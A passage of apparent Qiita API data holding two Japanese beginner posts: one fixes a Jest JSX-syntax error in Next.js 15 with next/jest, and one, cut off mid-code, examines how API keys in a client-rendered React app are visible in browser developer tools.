class=\"bold\">jest.config.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"kd\">type</span> <span class=\"p\">{</span> <span class=\"nx\">Config</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">jest</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"hil\"><span class=\"o\">+ </span><span class=\"k\">import</span> <span class=\"nx\">nextJest</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">next/jest.js</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n</span>\n<span class=\"hil\"><span class=\"o\">+ </span><span class=\"kd\">const</span> <span class=\"nx\">createJestConfig</span> <span class=\"o\">=</span> <span class=\"nf\">nextJest</span><span class=\"p\">({</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"c1\">// Provide the path to your Next.js app to load next.config.js and .env files in your + test environment</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"na\">dir</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">./</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span><span class=\"p\">});</span>\n</span>\n\n  <span class=\"c1\">// A map from regular expressions to module names or to arrays of module names that allow to stub out resources with a single module</span>\n<span class=\"hdl\"><span class=\"o\">- </span> <span class=\"nx\">moduleNameMapper</span><span class=\"p\">:</span> <span class=\"p\">{}</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"nx\">moduleNameMapper</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"dl\">\"</span><span class=\"s2\">^@/(.*)$</span><span class=\"dl\">\"</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">&lt;rootDir&gt;/src/$1</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"p\">},</span>\n</span>\n<span class=\"hdl\"><span class=\"o\">- </span><span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"nx\">config</span><span class=\"p\">;</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span><span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"nf\">createJestConfig</span><span class=\"p\">(</span><span class=\"nx\">config</span><span class=\"p\">);</span>\n</span></code></pre></div>\n</div>\n<h1 data-sourcepos=\"44:1-44:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"45:1-46:102\">エラーを調べても解決せず、時間がかかってしまいました。<br>\n公式ドキュメントに答えあり…しっかり読むことを戒めようと思いました。</p>\n<h1 data-sourcepos=\"48:1-48:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"49:1-49:47\"><iframe id=\"qiita-embed-content__1db4f585e404120078d01f99fdc34aea\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1db4f585e404120078d01f99fdc34aea\" data-content=\"https%3A%2F%2Fnextjs.org%2Fdocs%2Fapp%2Fguides%2Ftesting%2Fjest\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nNext.jsv15で`Jest`と`React Testing Library`を設定、テスト実行をしようとしたところ、エラーが発生しました。\n\n# 問題\n公式ドキュメントに沿って、Jestのテスト環境を構築\n`npm run test`を実行すると**Support for the experimental syntax 'jsx' isn't currently enabled**エラーが発生しました。\n\nhttps://nextjs.org/docs/app/guides/testing/jest#optional-handling-absolute-imports-and-module-path-aliases\n\n# 原因\nNext.jsのプロジェクトに、通常のJestの設定を行っていたため\n通常のJest設定のため、TypeScriptの変換処理ができていませんでした。\n\n公式ドキュメントの以下の文章を見落としていました。\n\n**公式ドキュメントより引用**\n>Update your config file to use next/jest. This transformer has all the necessary configuration options for Jest to work with Next.js:\n\n>next/jestを使うように設定ファイルを更新してください。このトランスフォーマーには、JestがNext.jsで動作するために必要な設定オプションがすべて含まれています：\n\n# 解決方法\n`jest.config.ts`の設定を修正\n\n```diff_typescript:jest.config.ts\nimport type { Config } from \"jest\";\n+ import nextJest from \"next/jest.js\";\n\n+ const createJestConfig = nextJest({\n+   // Provide the path to your Next.js app to load next.config.js and .env files in your + test environment\n+   dir: \"./\",\n+ });\n\n\n  // A map from regular expressions to module names or to arrays of module names that allow to stub out resources with a single module\n-  moduleNameMapper: {}\n+  moduleNameMapper: {\n+    \"^@/(.*)$\": \"<rootDir>/src/$1\",\n+  },\n\n- export default config;\n+ export default createJestConfig(config);\n```\n\n# おわりに\nエラーを調べても解決せず、時間がかかってしまいました。\n公式ドキュメントに答えあり…しっかり読むことを戒めようと思いました。\n\n# 参考\nhttps://nextjs.org/docs/app/guides/testing/jest\n","coediting":false,"comments_count":0,"created_at":"2025-07-13T20:01:21+09:00","group":null,"id":"26e3582082254c9902aa","likes_count":1,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"初心者","versions":[]},{"name":"Jest","versions":[]},{"name":"Next.js","versions":[]}],"title":"【Next.js + Jest】Support for the experimental syntax 'jsx' isn't currently enabled ","updated_at":"2025-07-13T20:01:21+09:00","url":"https://qiita.com/asa129/items/26e3582082254c9902aa","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":500,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:124\">先日、<code>CSR</code>、<code>SSR</code>、<code>SSG</code>について学習していました。<br>\nその中で、<strong>CSRだとAPIキーやトークンがブラウザ上で確認できる</strong>ということを知りました。</p>\n<p data-sourcepos=\"5:1-6:112\">私が作ったReactのプロダクトはAPIを使用しているけど、大丈夫？<br>\n.envファイルに定義したけど、それは意味ないの？など様々な疑問が発生しました。</p>\n<p data-sourcepos=\"8:1-8:156\">CSRの場合、なぜ確認できてしまうのか、どのように対策したらいいのか自分なりに学んだことをまとめてみました。</p>\n<h1 data-sourcepos=\"10:1-10:26\">\n<span id=\"csrssrssgとは\" class=\"fragment\"></span><a href=\"#csrssrssg%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>CSR、SSR、SSGとは？</h1>\n<p data-sourcepos=\"11:1-12:54\">今回、レンダリングについて3種類学びました。私なりに以下で理解しました。<br>\n※詳しい解説はこちらがおすすめです。</p>\n<p data-sourcepos=\"14:1-14:56\"><iframe id=\"qiita-embed-content__6ca2c2da505c2788e1cd6483183a1f8b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__6ca2c2da505c2788e1cd6483183a1f8b\" data-content=\"https%3A%2F%2Fqiita.com%2FSicut_study%2Fitems%2F7dc1b0cdcc1bee210f05\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"17:1-17:46\"><iframe id=\"qiita-embed-content__710004e138c9f1d49933b486148d9dd8\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__710004e138c9f1d49933b486148d9dd8\" data-content=\"https%3A%2F%2Fzenn.dev%2Frh820%2Farticles%2F6234843d726ed3\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h3 data-sourcepos=\"19:1-19:55\">\n<span id=\"csrクライアントサイドレンダリング\" class=\"fragment\"></span><a href=\"#csr%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%82%B5%E3%82%A4%E3%83%89%E3%83%AC%E3%83%B3%E3%83%80%E3%83%AA%E3%83%B3%E3%82%B0\"><i class=\"fa fa-link\"></i></a>CSR：クライアントサイドレンダリング</h3>\n<ul data-sourcepos=\"20:2-23:1\">\n<li data-sourcepos=\"20:2-20:40\">ブラウザ側でHTML、DOMを作る</li>\n<li data-sourcepos=\"21:2-21:53\">Reactのみで記載した場合はほとんどCSR</li>\n<li data-sourcepos=\"22:2-23:1\">tsxやjsxファイルからjsを作り、そのjsが実行されることにより、ブラウザでHTMLを作ってくれる</li>\n</ul>\n<h3 data-sourcepos=\"24:1-24:49\">\n<span id=\"ssrサーバーサイドレンダリング\" class=\"fragment\"></span><a href=\"#ssr%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E3%82%B5%E3%82%A4%E3%83%89%E3%83%AC%E3%83%B3%E3%83%80%E3%83%AA%E3%83%B3%E3%82%B0\"><i class=\"fa fa-link\"></i></a>SSR：サーバーサイドレンダリング</h3>\n<p data-sourcepos=\"25:1-25:95\">サーバー側でHTMLを作る、ブラウザは取得したHTMLをもとにDOMを作成する</p>\n<h3 data-sourcepos=\"27:1-27:61\">\n<span id=\"ssgスタティックサイトジェネレーション\" class=\"fragment\"></span><a href=\"#ssg%E3%82%B9%E3%82%BF%E3%83%86%E3%82%A3%E3%83%83%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B8%E3%82%A7%E3%83%8D%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3\"><i class=\"fa fa-link\"></i></a>SSG：スタティックサイトジェネレーション</h3>\n<p data-sourcepos=\"28:1-28:117\">サーバー側でHTMLを作るが、ビルド時のみ生成する。(SSRはリクエストする毎に生成する)</p>\n<h1 data-sourcepos=\"30:1-30:56\">\n<span id=\"実際にapiキーが確認できるか試してみた\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E9%9A%9B%E3%81%ABapi%E3%82%AD%E3%83%BC%E3%81%8C%E7%A2%BA%E8%AA%8D%E3%81%A7%E3%81%8D%E3%82%8B%E3%81%8B%E8%A9%A6%E3%81%97%E3%81%A6%E3%81%BF%E3%81%9F\"><i class=\"fa fa-link\"></i></a>実際にAPIキーが確認できるか試してみた</h1>\n<p data-sourcepos=\"31:1-32:108\">APIキーを本当に見ることができるのか、実際に試してみました。<br>\nまずは、tsxファイル上で、URLとAPIキーを直接書いて定義し、確認してみました。</p>\n<p data-sourcepos=\"34:1-34:105\"><iframe id=\"qiita-embed-content__8ad3c9074f368a793bc6a530161de16c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8ad3c9074f368a793bc6a530161de16c\" data-content=\"https%3A%2F%2Fstackblitz.com%2Fedit%2Fvitejs-vite-pw862uby%3Ffile%3Dsrc%252FApp.tsx%2Csrc%252Fdomain%252Fmovies.ts%26terminal%3Ddev\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"36:1-60:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"c1\">//　省略</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">movies</span><span class=\"p\">,</span> <span class=\"nx\">setMovies</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">([]);</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">options</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">GET</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n    <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"na\">accept</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">application/json</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n      <span class=\"na\">Authorization</span><span class=\"p\">:</span>\n        <span class=\"dl\">'</span><span class=\"s1\">Bearer APIキー</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"c1\">// APIキーを直接書いた</span>\n    <span class=\"p\">},</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"k\">async</span> <span class=\"kd\">function</span> <span class=\"nf\">fetchData</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">res</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">fetch</span><span class=\"p\">(</span>\n      <span class=\"dl\">'</span><span class=\"s1\">https://api.themoviedb.org/3/movie/popular?language=ja-JP&amp;page=1</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n      <span class=\"nx\">options</span>\n    <span class=\"p\">);</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">json</span><span class=\"p\">();</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">moviesData</span> <span class=\"o\">=</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">results</span><span class=\"p\">.</span><span class=\"nf\">map</span><span class=\"p\">(</span>\n      <span class=\"p\">(</span><span class=\"nx\">movie</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"k\">new</span> <span class=\"nc\">Movie</span><span class=\"p\">(</span><span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">,</span> <span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">original_title</span><span class=\"p\">,</span> <span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">overview</span><span class=\"p\">)</span>\n    <span class=\"p\">);</span>\n    <span class=\"nf\">setMovies</span><span class=\"p\">(</span><span class=\"nx\">moviesData</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"c1\">// 以下省略</span>\n</code></pre></div>\n</div>\n<details><summary><b>全量はこちら</b></summary>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"64:1-119:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">useEffect</span><span class=\"p\">,</span> <span class=\"nx\">useState</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">react</span><span class=\"dl\">'</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">Movie</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">./domain/movies.ts</span><span class=\"dl\">'</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"dl\">'</span><span class=\"s1\">./App.css</span><span class=\"dl\">'</span><span class=\"p\">;</span>\n\n<span class=\"kd\">function</span> <span class=\"nf\">App</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">movies</span><span class=\"p\">,</span> <span class=\"nx\">setMovies</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">([]);</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">options</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">GET</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n    <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"na\">accept</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">application/json</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n      <span class=\"na\">Authorization</span><span class=\"p\">:</span>\n        <span class=\"dl\">'</span><span class=\"s1\">Bearer APIキー</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n    <span class=\"p\">},</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"k\">async</span> <span class=\"kd\">function</span> <span class=\"nf\">fetchData</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">res</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">fetch</span><span class=\"p\">(</span>\n      <span class=\"dl\">'</span><span class=\"s1\">https://api.themoviedb.org/3/movie/popular?language=ja-JP&amp;page=1</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n      <span class=\"nx\">options</span>\n    <span class=\"p\">);</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">json</span><span class=\"p\">();</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">moviesData</span> <span class=\"o\">=</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">results</span><span class=\"p\">.</span><span class=\"nf\">map</span><span class=\"p\">(</span>\n      <span class=\"p\">(</span><span class=\"nx\">movie</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"k\">new</span> <span class=\"nc\">Movie</span><span class=\"p\">(</span><span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">,</span> <span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">original_title</span><span class=\"p\">,</span> <span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">overview</span><span class=\"p\">)</span>\n    <span class=\"p\">);</span>\n    <span class=\"nf\">setMovies</span><span class=\"p\">(</span><span class=\"nx\">moviesData</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"nf\">useEffect</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">fetchData</span><span class=\"p\">();</span>\n  <span class=\"p\">},</span> <span class=\"p\">[]);</span>\n\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">className</span><span class=\"p\">=</span><span class=\"s\">\"flex sm:ml-64\"</span><span class=\"p\">&gt;</span>\n          <span class=\"p\">&lt;</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>一覧表示する<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n          <span class=\"p\">&lt;</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n            <span class=\"si\">{</span><span class=\"nx\">movies</span><span class=\"p\">.</span><span class=\"nf\">map</span><span class=\"p\">((</span><span class=\"nx\">movie</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n              <span class=\"k\">return </span><span class=\"p\">(</span>\n                <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">key</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nt\">h2</span><span class=\"p\">&gt;</span><span class=\"si\">{</span><span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">title</span><span class=\"si\">}</span><span class=\"p\">&lt;/</span><span class=\"nt\">h2</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span><span class=\"si\">{</span><span class=\"nx\">movie</span><span class=\"p\">.</span><span class=\"nx\">overview</span><span class=\"si\">}</span><span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n              <span class=\"p\">);</span>\n            <span class=\"p\">})</span><span class=\"si\">}</span>\n          <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n    <span class=\"p\">&lt;/&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"nx\">App</span><span class=\"p\">;</span>\n\n</code></pre></div>\n</div>\n</details>\n<h2 data-sourcepos=\"123:1-123:24\">\n<span id=\"直接書いた結果\" class=\"fragment\"></span><a href=\"#%E7%9B%B4%E6%8E%A5%E6%9B%B8%E3%81%84%E3%81%9F%E7%B5%90%E6%9E%9C\"><i class=\"fa fa-link\"></i></a>直接書いた結果</h2>\n<p data-sourcepos=\"124:1-126:70\">開発者ツールよりSourcesを確認<br>\n<code>Authorization : Bearer ~</code>の箇所がAPIキーになります。簡単に確認できました。<br>\n<strong>誰でも簡単にAPIキーを取得することができます。</strong></p>\n<p data-sourcepos=\"128:1-128:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F439428b8-d901-477b-b2fb-86a557b37a1e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=da6039bd4f4cc22beeba5c3bd159d020\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F439428b8-d901-477b-b2fb-86a557b37a1e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=da6039bd4f4cc22beeba5c3bd159d020\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F439428b8-d901-477b-b2fb-86a557b37a1e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=a37e1a1bf8b137e4764a2e235a8157fc 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/439428b8-d901-477b-b2fb-86a557b37a1e.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"130:1-131:122\">Networkからも確認できます。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F94cc0033-4d62-4436-b538-dba33dc6250f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=92b0ce8d4dfad8f8737641cf4a863667\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F94cc0033-4d62-4436-b538-dba33dc6250f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=92b0ce8d4dfad8f8737641cf4a863667\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F94cc0033-4d62-4436-b538-dba33dc6250f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=264473d2e5ec266297f9abe98946a9e6 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/94cc0033-4d62-4436-b538-dba33dc6250f.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"133:1-133:72\">\n<span id=\"envファイルに環境変数で設定していれば大丈夫\" class=\"fragment\"></span><a href=\"#env%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AB%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%81%A7%E8%A8%AD%E5%AE%9A%E3%81%97%E3%81%A6%E3%81%84%E3%82%8C%E3%81%B0%E5%A4%A7%E4%B8%88%E5%A4%AB\"><i class=\"fa fa-link\"></i></a>.envファイルに環境変数で設定していれば大丈夫…？</h1>\n<p data-sourcepos=\"134:1-134:96\">APIを使用するときは、URLやAPIキーを、<code>.env</code>ファイルに定義しています。</p>\n<p data-sourcepos=\"136:1-136:57\">ここで以下の疑問や考えがでてきました。</p>\n<ol data-sourcepos=\"137:1-141:0\">\n<li data-sourcepos=\"137:1-138:76\">App.tsx上に定義すると、tsxファイルを元にjsファイルを作成、<br>\nそれを元にブラウザでHTMLを作るから、確認できてしまう</li>\n<li data-sourcepos=\"139:1-139:109\">.envファイルは別ファイルに定義して、定義した環境変数をtsx上で使用している</li>\n<li data-sourcepos=\"140:1-141:0\">そこから、.envファイルは直接定義するのを阻止するためにある？と疑問に思いました。</li>\n</ol>\n<p data-sourcepos=\"142:1-142:60\"><code>.env</code>ファイルに定義して確認してみました。</p>\n<p data-sourcepos=\"144:1-144:96\"><iframe id=\"qiita-embed-content__8f60787d591238da87a666416c4948be\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8f60787d591238da87a666416c4948be\" data-content=\"https%3A%2F%2Fstackblitz.com%2Fedit%2Fvitejs-vite-xg3cryb8%3Ffile%3Dsrc%252FApp.tsx%2Csrc%252Fdomain%252Fmovie.ts%2C.env\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"146:1-160:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"c1\">// 省略</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">movies</span><span class=\"p\">,</span> <span class=\"nx\">setMovies</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">([]);</span>\n<span class=\"hil\"><span class=\"o\">+ </span> <span class=\"kd\">const</span> <span class=\"nx\">apiKey</span> <span class=\"o\">=</span> <span class=\"k\">import</span><span class=\"p\">.</span><span class=\"nx\">meta</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VITE_TMDB_API_TOKEN</span><span class=\"p\">;</span>\n</span>  <span class=\"kd\">const</span> <span class=\"nx\">options</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">GET</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n    <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"na\">accept</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">application/json</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n<span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"na\">Authorization</span><span class=\"p\">:</span> <span class=\"s2\">`Bearer </span><span class=\"p\">${</span><span class=\"nx\">apiKey</span><span class=\"p\">}</span><span class=\"s2\">`</span><span class=\"p\">,</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span>     <span class=\"na\">Authorization</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">Bearer APIキー</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n</span>    <span class=\"p\">},</span>\n  <span class=\"p\">};</span>\n\n<span class=\"c1\">// 省略</span>\n</code></pre></div>\n</div>\n<div class=\"code-frame\" data-lang=\"dotenv\" data-sourcepos=\"162:1-164:3\">\n<div class=\"code-lang\"><span class=\"bold\">.env</span></div>\n<div class=\"highlight\"><pre><code>VITE_TMDB_API_TOKEN=APIキー\n</code></pre></div>\n</div>\n<details><summary><b>App.tsxの全量はこちら</b></summary>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"168:1-223:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">useEffect</span><span class=\"p\">,</span> <span class=\"nx\">useState</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">react</span><span class=\"dl\">'</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">Movie</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">./domain/movie.ts</span><span class=\"dl\">'</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"dl\">'</span><span class=\"s1\">./App.css</span><span class=\"dl\">'</span><span class=\"p\">;</span>\n\n<span class=\"kd\">function</span> <span class=\"nf\">App</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">movies</span><span 